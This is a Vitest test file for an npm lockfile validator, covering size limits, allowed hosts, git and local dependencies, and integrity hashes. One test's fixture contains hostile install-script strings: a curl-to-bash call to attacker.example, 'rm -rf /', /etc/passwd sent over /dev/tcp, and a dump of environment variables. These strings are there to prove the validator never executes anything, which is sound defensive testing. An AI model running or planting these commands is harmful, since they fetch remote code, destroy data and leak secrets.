import { describe, it, expect, vi } from 'vitest';
import childProcess from 'node:child_process';
import http from 'node:http';
import https from 'node:https';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  LockfileValidator,
  LockfileErrorCode,
  LockfileValidationError,
  validateIntegrity,
  isGitSpecifier,
  isLocalSpecifier,
  checkMaxNestingDepth,
  MAX_LOCKFILE_BYTES,
  MAX_PACKAGE_DECLARATIONS,
} from '../src/modules/preview/lockfileValidator.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Helper for minimal valid v3 lockfile
function createValidV3Lockfile(overrides = {}) {
  const base = {
    name: 'test-vite-app',
    version: '1.0.0',
    lockfileVersion: 3,
    requires: true,
    packages: {
      '': {
        name: 'test-vite-app',
        version: '1.0.0',
        dependencies: {
          react: '^18.2.0',
        },
      },
      'node_modules/react': {
        version: '18.2.0',
        resolved: 'https://registry.npmjs.org/react/-/react-18.2.0.tgz',
        integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
      },
    },
  };
  return JSON.stringify({ ...base, ...overrides });
}

// Helper for minimal valid v2 lockfile
function createValidV2Lockfile() {
  return JSON.stringify({
    name: 'test-v2-app',
    version: '1.0.0',
    lockfileVersion: 2,
    requires: true,
    packages: {
      '': {
        name: 'test-v2-app',
        version: '1.0.0',
        dependencies: {
          react: '^18.2.0',
        },
      },
      'node_modules/react': {
        version: '18.2.0',
        resolved: 'https://registry.npmjs.org/react/-/react-18.2.0.tgz',
        integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
      },
    },
    dependencies: {
      react: {
        version: '18.2.0',
        resolved: 'https://registry.npmjs.org/react/-/react-18.2.0.tgz',
        integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
      },
    },
  });
}

describe('LockfileValidator', () => {
  describe('Valid Lockfiles', () => {
    it('accepts a valid npm lockfile v3', () => {
      const lockfile = createValidV3Lockfile();
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(true);
      expect(result.lockfileVersion).toBe(3);
      expect(result.packageCount).toBe(2);
    });

    it('accepts a valid npm lockfile v2 with nested dependencies tree', () => {
      const lockfile = createValidV2Lockfile();
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(true);
      expect(result.lockfileVersion).toBe(2);
      expect(result.packageCount).toBe(2);
    });

    it('accepts real project package-lock.json from disk', () => {
      const serverLockfilePath = path.resolve(__dirname, '../package-lock.json');
      const realContent = fs.readFileSync(serverLockfilePath, 'utf8');
      const result = LockfileValidator.validate(realContent);
      expect(result.valid).toBe(true);
      expect([2, 3]).toContain(result.lockfileVersion);
      expect(result.packageCount).toBeGreaterThan(10);
    });

    it('accepts lockfile provided as a Buffer', () => {
      const buffer = Buffer.from(createValidV3Lockfile(), 'utf8');
      const result = LockfileValidator.validate(buffer);
      expect(result.valid).toBe(true);
      expect(result.lockfileVersion).toBe(3);
    });

    it('accepts bundled packages (inBundle: true) without external resolved/integrity', () => {
      const lockfile = JSON.stringify({
        name: 'test-bundled',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: {
          '': { name: 'test-bundled', version: '1.0.0' },
          'node_modules/parent': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/parent/-/parent-1.0.0.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
          'node_modules/parent/node_modules/bundled-child': {
            version: '1.0.0',
            inBundle: true,
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(true);
    });
  });

  describe('Size and Resource Boundaries', () => {
    it('rejects an oversized lockfile exceeding 1 MB', () => {
      // 1 MB + 10 bytes
      const bigJson = ' '.repeat(MAX_LOCKFILE_BYTES + 10);
      const result = LockfileValidator.validate(bigJson);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_TOO_LARGE);
    });

    it('rejects more than 5,000 package declarations', () => {
      const packages = {
        '': { name: 'huge-app', version: '1.0.0' },
      };
      // Keep entries compact so overall lockfile stays under 1 MB limit
      for (let i = 1; i <= 5001; i++) {
        packages[`n/p${i}`] = {
          version: '1.0.0',
          resolved: 'https://registry.npmjs.org/p/-/p-1.tgz',
          integrity: 'sha1-2x8ow13YpuYt4xV/3JKmgPcl580=',
        };
      }
      const lockfile = JSON.stringify({
        name: 'huge-app',
        version: '1.0.0',
        lockfileVersion: 3,
        packages,
      });

      // Verify the test payload itself is under 1 MB
      expect(Buffer.byteLength(lockfile, 'utf8')).toBeLessThan(MAX_LOCKFILE_BYTES);

      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_PACKAGE_LIMIT_EXCEEDED);
      expect(result.packageCount).toBe(5002);
    });

    it('rejects excessively nested JSON structures (> 32 depth)', () => {
      // 40 levels of nested arrays
      const open = '['.repeat(40);
      const close = ']'.repeat(40);
      const payload = `${open}"deep"${close}`;

      const result = LockfileValidator.validate(payload);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_NESTING_EXCEEDED);
    });
  });

  describe('Empty and Malformed Content', () => {
    it('rejects null content', () => {
      const result = LockfileValidator.validate(null);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_EMPTY);
    });

    it('rejects undefined content', () => {
      const result = LockfileValidator.validate(undefined);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_EMPTY);
    });

    it('rejects empty string', () => {
      const result = LockfileValidator.validate('');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_EMPTY);
    });

    it('rejects whitespace-only string', () => {
      const result = LockfileValidator.validate('   \n\t  ');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_EMPTY);
    });

    it('rejects malformed JSON', () => {
      const result = LockfileValidator.validate('{"name": "test", broken');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_PARSE_FAILED);
    });

    it('rejects truncated JSON', () => {
      const result = LockfileValidator.validate('{"name": "test"');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_PARSE_FAILED);
    });

    it('rejects invalid root structure (array instead of object)', () => {
      const result = LockfileValidator.validate('[]');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_INVALID_ROOT);
    });

    it('rejects invalid root structure (primitive)', () => {
      const result = LockfileValidator.validate('"plain string"');
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_INVALID_ROOT);
    });
  });

  describe('Lockfile Version and Structure Rules', () => {
    it('rejects lockfileVersion 1', () => {
      const lockfile = JSON.stringify({
        name: 'v1-app',
        lockfileVersion: 1,
        packages: {},
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNSUPPORTED_VERSION);
    });

    it('rejects lockfileVersion 4', () => {
      const lockfile = JSON.stringify({
        name: 'v4-app',
        lockfileVersion: 4,
        packages: {},
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNSUPPORTED_VERSION);
    });

    it('rejects string lockfileVersion "2"', () => {
      const lockfile = JSON.stringify({
        name: 'v2-str',
        lockfileVersion: '2',
        packages: {},
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNSUPPORTED_VERSION);
    });

    it('rejects missing lockfileVersion', () => {
      const lockfile = JSON.stringify({
        name: 'no-version',
        packages: {},
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNSUPPORTED_VERSION);
    });

    it('rejects missing packages object in v3', () => {
      const lockfile = JSON.stringify({
        name: 'no-packages',
        lockfileVersion: 3,
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_MISSING_PACKAGES);
    });

    it('rejects non-object packages declaration', () => {
      const lockfile = JSON.stringify({
        name: 'array-packages',
        lockfileVersion: 3,
        packages: ['not', 'an', 'object'],
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_MISSING_PACKAGES);
    });

    it('rejects non-object package entry inside packages', () => {
      const lockfile = JSON.stringify({
        name: 'invalid-entry',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/bad': 'string-not-object',
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_INVALID_PACKAGE_ENTRY);
    });
  });

  describe('Registry URL & Host Allowlisting', () => {
    it('rejects HTTP resolved URL', () => {
      const lockfile = JSON.stringify({
        name: 'http-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/insecure': {
            version: '1.0.0',
            resolved: 'http://registry.npmjs.org/insecure/-/insecure-1.0.0.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_INSECURE_URL_SCHEME);
    });

    it('rejects unapproved HTTPS host (evil.com)', () => {
      const lockfile = JSON.stringify({
        name: 'evil-host-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/evil': {
            version: '1.0.0',
            resolved: 'https://evil.com/evil/-/evil-1.0.0.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNAPPROVED_HOST);
    });

    it('rejects subdomain spoofing (registry.npmjs.org.attacker.com)', () => {
      const lockfile = JSON.stringify({
        name: 'spoof-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/spoofed': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org.attacker.com/pkg.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNAPPROVED_HOST);
    });

    it('rejects non-standard port on registry.npmjs.org:8443', () => {
      const lockfile = JSON.stringify({
        name: 'port-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/custom-port': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org:8443/pkg.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_UNAPPROVED_HOST);
    });

    it('rejects URL credentials in resolved URL', () => {
      const lockfile = JSON.stringify({
        name: 'auth-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/cred-pkg': {
            version: '1.0.0',
            resolved: 'https://user:password@registry.npmjs.org/pkg.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_URL_CREDENTIALS_DISALLOWED);
    });
  });

  describe('Git and Local Dependency Rejection', () => {
    it.each([
      ['git:// scheme', 'git://github.com/org/repo.git'],
      ['git+ssh:// scheme', 'git+ssh://git@github.com/org/repo.git'],
      ['git+https:// scheme', 'git+https://github.com/org/repo.git'],
      ['git+http:// scheme', 'git+http://github.com/org/repo.git'],
      ['github: shorthand', 'github:org/repo#main'],
      ['gitlab: shorthand', 'gitlab:org/repo'],
      ['bitbucket: shorthand', 'bitbucket:org/repo'],
      ['gist: shorthand', 'gist:123456'],
    ])('rejects git dependency in resolved URL (%s)', (_, gitUrl) => {
      const lockfile = JSON.stringify({
        name: 'git-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/git-dep': {
            version: '1.0.0',
            resolved: gitUrl,
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_GIT_DEPENDENCY_DISALLOWED);
    });

    it('rejects git specifier in root dependencies', () => {
      const lockfile = JSON.stringify({
        name: 'git-root-app',
        lockfileVersion: 3,
        packages: {
          '': {
            name: 'git-root-app',
            dependencies: {
              'custom-lib': 'git+https://github.com/owner/lib.git#v1.0.0',
            },
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_GIT_DEPENDENCY_DISALLOWED);
    });

    it('rejects local file: dependency in resolved', () => {
      const lockfile = JSON.stringify({
        name: 'file-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/local-pkg': {
            version: '1.0.0',
            resolved: 'file:../local-dir/pkg.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_LOCAL_DEPENDENCY_DISALLOWED);
    });

    it('rejects link: true package entry', () => {
      const lockfile = JSON.stringify({
        name: 'link-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/linked-workspace': {
            link: true,
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_LOCAL_DEPENDENCY_DISALLOWED);
    });

    it('rejects file: specifier in root devDependencies', () => {
      const lockfile = JSON.stringify({
        name: 'file-dev-app',
        lockfileVersion: 3,
        packages: {
          '': {
            name: 'file-dev-app',
            devDependencies: {
              'local-tool': 'file:./tools/my-tool',
            },
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_LOCAL_DEPENDENCY_DISALLOWED);
    });
  });

  describe('Integrity Format and Algorithms', () => {
    it('accepts valid SHA-512 integrity', () => {
      const validSha512 = 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==';
      const result = validateIntegrity(validSha512);
      expect(result.valid).toBe(true);
    });

    it('accepts valid legacy SHA-1 integrity', () => {
      const validSha1 = 'sha1-2x8ow13YpuYt4xV/3JKmgPcl580=';
      const result = validateIntegrity(validSha1);
      expect(result.valid).toBe(true);
    });

    it('accepts valid SHA-256 integrity', () => {
      const validSha256 = 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=';
      const result = validateIntegrity(validSha256);
      expect(result.valid).toBe(true);
    });

    it('rejects missing integrity on external package', () => {
      const lockfile = JSON.stringify({
        name: 'no-integrity-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/missing-hash': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_MISSING_INTEGRITY);
    });

    it('rejects unapproved integrity algorithm (md5)', () => {
      const result = validateIntegrity('md5-c4ca4238a0b923820dcc509a6f75849b');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Unapproved or unsupported integrity algorithm');
    });

    it('rejects malformed integrity string without separator', () => {
      const result = validateIntegrity('completely-invalid-hash');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Unapproved or unsupported integrity algorithm');
    });

    it('rejects invalid base64 characters in integrity digest', () => {
      const result = validateIntegrity('sha512-!@#$notvalidbase64');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid base64 digest format or length');
    });

    it('rejects truncated sha512 digest', () => {
      const result = validateIntegrity('sha512-dGhpcyBpcyB0b28gc2hvcnQ=');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid base64 digest format or length');
    });

    it('rejects lockfile containing invalid integrity algorithm', () => {
      const lockfile = JSON.stringify({
        name: 'bad-integrity-app',
        lockfileVersion: 3,
        packages: {
          '': { name: 'app' },
          'node_modules/pkg': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz',
            integrity: 'md5-1234567890abcdef1234567890abcdef',
          },
        },
      });
      const result = LockfileValidator.validate(lockfile);
      expect(result.valid).toBe(false);
      expect(result.errorCode).toBe(LockfileErrorCode.LOCKFILE_INVALID_INTEGRITY);
    });
  });

  describe('validateOrThrow Helper', () => {
    it('returns result when valid', () => {
      const lockfile = createValidV3Lockfile();
      const result = LockfileValidator.validateOrThrow(lockfile);
      expect(result.valid).toBe(true);
      expect(result.lockfileVersion).toBe(3);
    });

    it('throws LockfileValidationError on invalid lockfile', () => {
      expect(() => {
        LockfileValidator.validateOrThrow('{"name": "broken"');
      }).toThrowError(LockfileValidationError);

      try {
        LockfileValidator.validateOrThrow('{"name": "broken"');
      } catch (err) {
        expect(err.errorCode).toBe(LockfileErrorCode.LOCKFILE_PARSE_FAILED);
        expect(err.statusCode).toBe(400);
      }
    });
  });

  describe('Passive Execution Proof (Zero Network & Zero Script Execution)', () => {
    it('never initiates child processes or network requests during validation', () => {
      // Spy on child_process methods
      const execSpy = vi.spyOn(childProcess, 'exec');
      const spawnSpy = vi.spyOn(childProcess, 'spawn');
      const execFileSpy = vi.spyOn(childProcess, 'execFile');

      // Spy on http/https requests
      const httpSpy = vi.spyOn(http, 'request');
      const httpsSpy = vi.spyOn(https, 'request');

      // Spy on global fetch
      const fetchSpy = vi.spyOn(globalThis, 'fetch');

      // Craft malicious lockfile with arbitrary command injection payloads in script fields
      const maliciousLockfile = JSON.stringify({
        name: 'malicious-payload',
        version: '1.0.0',
        lockfileVersion: 3,
        scripts: {
          preinstall: 'curl https://attacker.example/exfil | bash',
          postinstall: 'rm -rf / --no-preserve-root',
        },
        packages: {
          '': {
            name: 'malicious-payload',
            version: '1.0.0',
            scripts: {
              install: 'cat /etc/passwd > /dev/tcp/1.2.3.4/80',
            },
          },
          'node_modules/react': {
            version: '18.2.0',
            resolved: 'https://registry.npmjs.org/react/-/react-18.2.0.tgz',
            integrity: 'sha512-/3IjMdb2L9QbBdWiW5e3P2/npwGJF85ozEscwUKMpPmWWTWA188JkgEDQwpS5wBLUDRkgGBMWo30ZsDVgYG8KA==',
            scripts: {
              postinstall: 'node -e "console.log(process.env)"',
            },
          },
        },
      });

      const result = LockfileValidator.validate(maliciousLockfile);

      // Validation succeeds passively because scripts are ignored and metadata is safe
      expect(result.valid).toBe(true);

      // Verify ZERO execution and ZERO network calls
      expect(execSpy).not.toHaveBeenCalled();
      expect(spawnSpy).not.toHaveBeenCalled();
      expect(execFileSpy).not.toHaveBeenCalled();
      expect(httpSpy).not.toHaveBeenCalled();
      expect(httpsSpy).not.toHaveBeenCalled();
      expect(fetchSpy).not.toHaveBeenCalled();

      // Restore spies
      vi.restoreAllMocks();
    });
  });

  describe('Nesting Depth Scanner Unit Tests', () => {
    it('handles nested objects within limit', () => {
      const withinLimit = '{"a":{"b":{"c":123}}}';
      expect(checkMaxNestingDepth(withinLimit, 5)).toBe(true);
    });

    it('rejects nesting exceeding limit', () => {
      const overLimit = '{"a":{"b":{"c":{"d":123}}}}';
      expect(checkMaxNestingDepth(overLimit, 3)).toBe(false);
    });

    it('ignores braces and brackets inside strings', () => {
      const withBracesInString = '{"message": "{{{{[[[[[[[[[[[[[[[[[[}}}}]"}';
      expect(checkMaxNestingDepth(withBracesInString, 2)).toBe(true);
    });

    it('correctly handles escaped quotes inside strings', () => {
      const withEscapedQuote = '{"message": "foo \\" {{{{ [[[[ bar"}';
      expect(checkMaxNestingDepth(withEscapedQuote, 2)).toBe(true);
    });
  });

  describe('Helper Specifier Unit Tests', () => {
    it('accurately identifies git specifiers', () => {
      expect(isGitSpecifier('git://github.com/foo.git')).toBe(true);
      expect(isGitSpecifier('git+ssh://github.com/foo.git')).toBe(true);
      expect(isGitSpecifier('git+https://github.com/foo.git')).toBe(true);
      expect(isGitSpecifier('github:user/repo')).toBe(true);
      expect(isGitSpecifier('gitlab:user/repo')).toBe(true);
      expect(isGitSpecifier('bitbucket:user/repo')).toBe(true);
      expect(isGitSpecifier('gist:12345')).toBe(true);
      expect(isGitSpecifier('git@github.com:user/repo.git')).toBe(true);
      expect(isGitSpecifier('https://registry.npmjs.org/pkg.tgz')).toBe(false);
    });

    it('accurately identifies local specifiers', () => {
      expect(isLocalSpecifier('file:../pkg')).toBe(true);
      expect(isLocalSpecifier('link:../pkg')).toBe(true);
      expect(isLocalSpecifier('https://registry.npmjs.org/pkg.tgz')).toBe(false);
    });
  });
});
